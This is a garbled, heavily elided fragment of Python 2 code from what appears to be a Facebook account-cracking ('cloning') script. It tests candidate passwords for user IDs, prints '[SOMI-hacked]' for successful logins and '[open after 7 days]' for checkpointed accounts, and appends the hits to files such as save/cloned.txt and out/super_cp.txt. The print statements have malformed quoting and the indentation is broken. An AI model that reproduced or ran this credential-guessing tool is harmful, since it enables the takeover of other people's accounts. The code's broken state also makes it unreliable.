	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[SOMI-hacked]  + b['name']' + k + c + user + '  |  ' + pass1
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;93m[open after 7 days] + b['name'] ' + k + c + user + '  |  ' + pass1
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m[SOMI-hacked]  + b['name']' + k + c + user + '  |  ' + pass2																			
 				        okb = open('save/cloned.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					    	print '\033[1;93m[open after 7 days] + b['name']' + k + c + user + '  |  ' + pass2			
 					        cps = open('out/super_cp.txt', 'a')
